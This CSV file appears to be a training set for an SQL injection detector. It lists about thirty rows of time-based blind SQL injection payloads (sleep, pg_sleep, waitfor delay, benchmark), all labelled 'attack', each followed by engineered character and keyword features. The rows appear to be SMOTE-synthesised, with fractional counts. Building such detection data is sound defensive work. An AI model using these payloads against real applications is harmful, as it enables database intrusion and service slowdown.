id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000443,attack,time,"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000235,0.7044302726551673,88.41501415693111,25.146246460767223,3.4115356888820445,24.16997168613779,10.0,39.830028313862215,14.415014156931106,0.2739698816202046,0.11313282993135346,0.4500802299404576,0.1628170585079844,0.0,3.9999999999999996,0.0,0.0,0.0,2.0,0.0,5.707507078465553,1.707507078465553,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000444,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,0.5238464956600403,129.2087824910691,31.85614227110347,3.729974116841634,50.56842681331041,10.0,51.856142271103465,16.784213406655205,0.39128943624342793,0.07743452974074397,0.40145066617374653,0.1298253678420816,2.8561422711034687,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,3.9280711355517344,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9280711355517344,3.0,0.0,1.0,1.9280711355517344,0.9280711355517344,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.856142271103469
SMOTE_000445,attack,time,1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,nearest_attack_euclidean,R000185,1.0590817183717236,66.93410397454142,16.284708368265196,2.546572636633943,10.357645815867402,10.0,38.861166526939215,7.715291631734804,0.15512454883188162,0.1502914972661059,0.5797138026841869,0.11487015121782554,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.715291631734804,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.3576458158674019,0.6423541841325984,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000446,attack,time,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000233,0.569722172757824,73.0,25.817876377142532,3.5743762176527847,16.0,18.0,30.0,9.0,0.2191780821917808,0.2465753424657534,0.410958904109589,0.1232876712328767,0.18212362285746742,0.8178763771425327,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.18212362285746736,0.8178763771425326,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000447,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.052547728749336255,100.0,33.26690646747132,4.070666856629011,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000448,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.6343569870991453,41.307041922900304,16.0,2.8759305992476643,11.0,0.8464790385498482,20.307041922900304,9.153520961450152,0.26637693638576104,0.020645830208532875,0.49146221235445625,0.22151502105124987,0.15352096145015204,1.1102230246251565e-16,0.0,0.0,0.0,0.15352096145015193,0.0,4.0,0.0,4.0,0.0,0.15352096145015182,0.15352096145015187,0.0,0.0,0.8464790385498482,0.0,0.15352096145015193,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000449,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000297,1.4021276532862934,83.0,25.0,3.236038726621691,30.0,2.0,39.0,12.0,0.3614457831325301,0.02409638554216867,0.46987951807228917,0.14457831325301204,0.5507000923370352,0.44929990766296485,0.0,0.0,1.0,0.0,0.0,8.0,1.0,0.0,0.0,1.0,0.5507000923370352,0.4492999076629648,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000450,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,0.44906095423505954,76.84506967068643,26.83423612851434,3.4375418875905486,20.0,10.0,35.342361285143404,11.502708385543022,0.2614304960848238,0.1307152480424119,0.4585306796530363,0.14932357621972797,1.0,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,5.668472257028681,0.8342361285143406,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000451,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,1.3777741222339643,51.751599450925255,18.562633287577107,3.3398722524202875,23.813166437885524,1.4373667124228948,20.375799725462628,6.1252665751542095,0.46074421100796026,0.029309279983305944,0.39225489161017113,0.11769161739856263,2.12526657515421,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.5626332875771047,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.43736671242289504,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.562633287577105,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.562633287577105
SMOTE_000452,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,1.547508324687746,61.1209983506428,18.917200219914292,2.9487961880379565,10.000000000000002,10.0,31.57959846059995,9.541399890042854,0.1661459535220788,0.1661459535220788,0.5102149716971061,0.1574931212587364,0.45860010995714673,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.624199670128561,0.4586001099571465,0.0,1.0,1.0,0.4586001099571465,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000453,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.3377401542696087,32.163442124131784,16.0,3.1827736760473337,11.0,0.08172106206589547,13.081721062065895,8.0,0.34209755205381465,0.002403560648996869,0.4067006676216869,0.24879821967550156,0.9182789379341063,1.1102230246251565e-16,0.0,0.0,0.0,0.9182789379341063,0.0,2.0817210620658932,0.0,4.0,0.0,0.9182789379341063,0.9182789379341063,0.0,0.0,0.08172106206589361,0.0,0.9182789379341064,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000454,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,0.3033358778541881,77.9583063921217,26.869788299015212,3.4137656336663715,20.0,10.0,36.21872979409128,11.739576598030427,0.2568789217610209,0.12843946088051042,0.4642221995408643,0.15045941781760444,0.0,1.0,2.0,0.0,0.0,1.0,0.0,5.869788299015213,0.8697882990152132,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000455,attack,time,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""ykhp"" like ""ykhp",nearest_attack_euclidean,R000267,0.22133757348334862,123.8582101348314,24.90485084456928,3.1513272716950285,43.19029831086144,2.0,61.858210134831396,16.809701689138567,0.349159947119287,0.016161669361439812,0.49898824979536616,0.13569013372390706,0.0,3.9999999999999996,0.0,0.0,1.0,0.0,0.0,11.809701689138565,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.9048508445692829,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.9048508445692836
SMOTE_000456,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,0.8061532271105689,112.09978908128342,24.45010545935829,3.281318554742052,44.09978908128342,2.0,51.0,15.0,0.39334972953258973,0.017842655013747363,0.45498770285055773,0.13381991260310522,0.0,3.9999999999999996,0.0,0.0,1.0,0.0,0.0,10.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.4501054593582892,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.450105459358289
SMOTE_000457,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.4443685904979187,64.20697504541987,19.206975045419867,2.8820494900493,10.000000000000002,10.0,34.0,10.206975045419865,0.15575246383312533,0.15575246383312533,0.5295583770326261,0.15893669530112325,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.0,0.20697504541986578,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000458,attack,time,1'||  (  select 'tznb' from dual where 8808  =  8808 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000270,0.9258635919920006,131.01124689674592,33.51687034511889,3.764079102481803,52.011246896745924,10.0,52.0,17.0,0.3969631995829212,0.07633377220469352,0.3969356154644063,0.12976741274797898,3.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,1.0,2.0,0.4943765516270372,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.494376551627036
SMOTE_000459,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000149,0.7719474422379862,83.69475261026415,22.265067469927963,3.069396733690752,27.755022489975985,2.0,41.44977510024013,12.489955020048026,0.3328910022276783,0.023968128660691326,0.49400649910348216,0.1491343700081482,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.489955020048026,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,0.7550224899759872,0.24497751002401277,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000460,attack,time,1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000151,0.32503517384704866,102.09167965938346,31.609167965938347,3.7160120417671227,29.827503897815035,18.0,42.65500779563007,11.609167965938346,0.2921098446388226,0.17752849562649164,0.4165538878526253,0.11380777188206045,1.0,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,5.6091679659383455,0.0,1.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000461,attack,time," select sleep  (  5  )   and   (  ""zsjw"" like ""zsjw",nearest_attack_euclidean,R000232,0.5790853802223952,53.77957811278826,19.19854129377059,3.440667424865878,26.397082587541178,1.0,19.786871643935307,6.595623881311769,0.4941122718045567,0.018769358035357994,0.365338777620064,0.12177959254002133,0.0,3.0,0.0,0.0,0.0,0.0,0.0,3.3970825875411794,0.0,0.19854129377058982,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8014587062294102,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8014587062294103
SMOTE_000462,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.06696895315082776,44.66035996101468,16.88678665367156,3.0738607557153803,13.0,0.8867866536715603,19.77357330734312,11.0,0.29122503730519,0.019706370081590235,0.4426474072011359,0.24642118541208385,0.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000463,attack,time,"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000181,0.07249038243593371,52.95534964275882,19.95534964275881,3.2419091927731705,10.000000000000002,10.0,24.0,8.955349642758813,0.18884443343411467,0.18884443343411467,0.45322664024187514,0.16908449288989558,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.0,0.9776748213794064,0.0,1.0,1.0,0.0,1.0,0.0,0.9776748213794064,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000464,attack,time,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000213,1.2682194103373752,69.62220914621942,25.625398693397226,3.677349940830677,15.749202613205547,20.250797386794453,25.498405226411094,8.12380391980832,0.22607168977238412,0.29220190255034706,0.3657644474909797,0.11596196018628915,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.374601306602774,0.3746013066027739,0.0,1.0,1.0,0.0,1.0,0.0,0.3746013066027739,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000465,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,1.2225778545231372,34.56378215661852,16.478739281127158,3.3919584197746446,13.0,0.0,11.56378215661853,10.0,0.37682729963296224,0.0,0.33330554680322066,0.2898671535638171,0.0,0.4787392811271573,2.0,0.0,0.0,0.0,0.0,2.5212607188728424,0.0,5.0,0.0,2.0,0.0,0.47873928112715713,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000466,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000299,2.4000121563533163,84.2262504613512,28.712083350420414,4.1989554469211186,39.10541695714706,9.151666598318341,22.18895852983477,13.780208376051037,0.44999913894739185,0.1308524012093701,0.2494007495772907,0.1697477102659474,4.643958324789792,1.1102230246251565e-16,2.0,0.0,0.0,0.6439583247897925,0.0,2.7802083760510374,0.0,0.0,0.3560416752102075,4.0,1.0,0.0,1.0,0.0,0.0,0.6439583247897926,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.6439583247897925,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6439583247897924
SMOTE_000467,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000203,1.2231740241811129,93.43462683875052,24.721552206500625,3.374414461749013,22.147701471000417,18.0,41.13922389674969,12.147701471000417,0.23671687267125474,0.1927584846372132,0.44089581704095127,0.12962882565058076,1.8607761032503123,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.5738507355002085,1.0,0.0,0.0,0.713074632249896,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.2869253677501042,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2869253677501042
SMOTE_000468,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000085,1.1249619028240745,94.0,23.0,3.204505587362183,31.0,2.0,45.0,16.0,0.32978723404255317,0.021276595744680854,0.4787234042553192,0.1702127659574468,3.088364010809424,0.9116359891905752,0.0,0.0,1.0,1.0,0.0,8.0,2.0,0.0,0.0,2.0,0.772091002702356,0.22790899729764397,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000469,attack,time,1%' or sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000255,0.045678269105906874,37.27912812608048,17.0,3.1475141251493954,10.000000000000002,2.0,16.223302500864385,9.055825625216096,0.26866516316227446,0.05373303263245488,0.43461537809930684,0.24298642610596394,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.0558256252160954,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000470,attack,time,select sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000298,0.45348519469834375,53.11466078496033,16.126477030719954,2.7109914608685806,13.494091877120187,1.1264770307199532,28.367614846400233,10.126477030719954,0.25337892449765387,0.02155835259019588,0.5336982028927357,0.19136452001941456,3.126477030719953,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.873522969280047,1.1264770307199532,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.8735229692800466,0.0,2.7755575615628914e-17,0.0,1.0,0.12647703071995328,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000471,attack,time,select pg_sleep  (  5  )   and 'rpka'  =  'rpka,nearest_attack_euclidean,R000241,0.4828153528079142,49.44010691729153,18.511978616541697,3.5174630944087704,24.0,1.0,16.95208553383322,7.488021383458305,0.48667652781710447,0.02027818865904603,0.34171293630555993,0.15133234721828956,3.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.4880213834583045,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000472,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000287,1.6013012524938601,66.0,25.070600122369473,3.596299369094803,19.535300061184735,10.0,27.0,9.464699938815263,0.2959893948664354,0.15151515151515152,0.4090909090909091,0.143404544527504,1.0,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.0,0.46469993881526406,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.5353000611847359,0.46469993881526417,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000473,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,0.3684053408919614,83.2246328233446,20.887683588327697,3.077296509607931,30.550734353310787,2.0,40.33694923501691,10.33694923501691,0.3672214505742186,0.024032705081971764,0.484618210286693,0.12412763405711658,0.112316411672303,1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.112316411672303,0.1123164116723031,0.0,0.0,1.0,0.11231641167230311,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
